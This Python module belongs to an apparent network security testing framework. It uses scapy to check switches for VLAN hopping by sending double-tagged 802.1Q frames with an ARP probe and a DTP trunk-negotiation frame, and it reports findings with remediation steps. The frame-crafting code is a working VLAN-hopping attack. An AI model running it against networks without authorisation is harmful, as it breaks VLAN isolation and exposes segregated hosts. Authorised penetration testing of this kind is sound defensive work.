"""
Task: run_vlan_hop
Security test for VLAN hopping vulnerabilities.

Tests:
  1. Double-tagging: Crafts frames with two 802.1Q headers (outer = native VLAN,
     inner = target VLAN). If the switch strips only the outer tag and forwards,
     the frame reaches the target VLAN. ARP replies from that VLAN confirm transit.
  2. DTP negotiation: Sends a DTP "desirable" frame and listens for a response,
     indicating the switch will negotiate a trunk link.

Requires: scapy (pip3 install scapy) and CAP_NET_RAW / root.

Payload:
  interface:   network interface (default: eth0)
  native_vlan: native/access VLAN on this port (default: 1)
  target_vlan: VLAN ID to attempt to hop to (required)
  target_ip:   optional IP in target VLAN to ARP-probe (confirms transit)
  timeout:     seconds to wait for responses (default: 5)
"""

import asyncio
import logging
import re

logger = logging.getLogger(__name__)

SAFE_IFACE_RE = re.compile(r'^[a-zA-Z0-9.\-_]+$')


async def run(payload: dict) -> dict:
    interface   = payload.get("interface", "eth0")
    native_vlan = int(payload.get("native_vlan", 1))
    target_vlan = payload.get("target_vlan")
    target_ip   = payload.get("target_ip", "")
    timeout     = float(payload.get("timeout", 5))

    if target_vlan is None:
        raise ValueError("target_vlan is required")
    target_vlan = int(target_vlan)

    if not SAFE_IFACE_RE.match(interface):
        raise ValueError(f"Invalid interface: {interface!r}")
    if not (1 <= native_vlan <= 4094) or not (1 <= target_vlan <= 4094):
        raise ValueError("VLAN IDs must be between 1 and 4094")
    if native_vlan == target_vlan:
        raise ValueError("native_vlan and target_vlan must differ")

    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        None, _run_tests, interface, native_vlan, target_vlan, target_ip, timeout,
    )


def _run_tests(interface, native_vlan, target_vlan, target_ip, timeout) -> dict:
    try:
        from scapy.all import Ether, Dot1Q, ARP, LLC, SNAP, sendp, sniff, conf, get_if_hwaddr
    except ImportError:
        return {"error": "scapy not installed — run: pip3 install scapy", "supported": False}

    conf.verb = 0

    try:
        local_mac = get_if_hwaddr(interface)
    except Exception as e:
        return {"error": f"Cannot read MAC for {interface}: {e}"}

    findings = []
    findings.append(_test_double_tag(interface, local_mac, native_vlan, target_vlan,
                                     target_ip or "192.0.2.1", timeout))
    findings.append(_test_dtp(interface, local_mac, timeout))

    return {
        "interface":   interface,
        "native_vlan": native_vlan,
        "target_vlan": target_vlan,
        "findings":    findings,
        "vulnerable":  any(f.get("vulnerable") for f in findings),
    }


def _test_double_tag(interface, local_mac, native_vlan, target_vlan, probe_ip, timeout) -> dict:
    import threading
    from scapy.all import Ether, Dot1Q, ARP, sendp, sniff

    # Outer tag = native VLAN (stripped by first switch hop), inner = target VLAN
    frame = (
        Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff") /
        Dot1Q(vlan=native_vlan, type=0x8100) /
        Dot1Q(vlan=target_vlan) /
        ARP(op="who-has", pdst=probe_ip, hwsrc=local_mac)
    )

    replies = []

    def _capture(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # is-at
            replies.append({"src_mac": pkt[ARP].hwsrc, "src_ip": pkt[ARP].psrc})

    done = threading.Event()

    def _sniff():
        sniff(iface=interface, filter="arp", timeout=timeout,
              prn=_capture, store=False)
        done.set()

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()

    try:
        sendp(frame, iface=interface, count=3, inter=0.1, verbose=False)
    except PermissionError:
        return {"test": "double_tagging", "error": "Permission denied — root/CAP_NET_RAW required"}
    except Exception as e:
        return {"test": "double_tagging", "error": str(e)}

    done.wait(timeout=timeout + 1)
    t.join(timeout=1)

    vulnerable = len(replies) > 0
    return {
        "test":        "double_tagging",
        "native_vlan": native_vlan,
        "target_vlan": target_vlan,
        "frames_sent": 3,
        "replies":     replies,
        "vulnerable":  vulnerable,
        "description": (
            f"ARP replies received from VLAN {target_vlan} — double-tag hop succeeded. "
            "Ensure the native VLAN is not used for user traffic and disable DTP on access ports."
        ) if vulnerable else (
            "No ARP replies from target VLAN. Switch may not be vulnerable, "
            "or no host at target_ip responded."
        ),
    }


def _test_dtp(interface, local_mac, timeout) -> dict:
    import threading
    from scapy.all import Ether, LLC, SNAP, sendp, sniff

    DTP_MULTICAST = "01:00:0c:cc:cc:cc"

    # Minimal DTP "desirable" frame: SNAP header + DTP status TLV
    dtp_payload = bytes([
        0x20, 0x04,                   # DTP type
        0x00, 0x01,                   # domain TLV length
        0x01, 0x00, 0x01, 0x04,       # status = desirable (0x01)
    ])

    frame = (
        Ether(src=local_mac, dst=DTP_MULTICAST) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2004) /
        dtp_payload
    )

    dtp_replies = []

    def _capture(pkt):
        if pkt.haslayer(SNAP) and pkt[SNAP].code == 0x2004:
            dtp_replies.append(pkt[Ether].src)

    done = threading.Event()

    def _sniff():
        sniff(iface=interface, filter="ether proto 0x8100 or ether dst 01:00:0c:cc:cc:cc",
              timeout=timeout, prn=_capture, store=False)
        done.set()

    t = threading.Thread(target=_sniff, daemon=True)
    t.start()

    try:
        sendp(frame, iface=interface, count=2, verbose=False)
    except Exception:
        pass

    done.wait(timeout=timeout + 1)
    t.join(timeout=1)

    vulnerable = len(dtp_replies) > 0
    return {
        "test":       "dtp_negotiation",
        "replies":    dtp_replies,
        "vulnerable": vulnerable,
        "description": (
            f"Switch responded to DTP frames — port will negotiate trunking. "
            "Set all access ports to: switchport mode access / switchport nonegotiate"
        ) if vulnerable else (
            "No DTP response. Port appears to be in static access mode or DTP is disabled."
        ),
    }
